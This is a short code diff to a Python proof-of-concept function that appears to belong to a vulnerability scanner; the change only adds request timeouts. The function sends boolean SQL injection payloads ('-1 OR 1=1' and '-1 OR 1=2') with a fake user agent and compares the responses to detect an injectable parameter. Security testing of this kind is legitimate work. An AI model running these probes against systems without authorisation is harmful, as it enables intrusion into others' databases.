@@ -34,8 +34,8 @@ def poc(url):
     headers = {'User-Agent': loadfakeuseragent(),
                'Content-Type': 'application/x-www-form-urlencoded'}
     try:
-        r1 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=1'))
-        r2 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=2'))
+        r1 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=1'), timeout=60)
+        r2 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=2'), timeout=60)
     except:
         return False
     if r1.status_code == r2.status_code == 200 and len(r1.content) != len(r2.content):
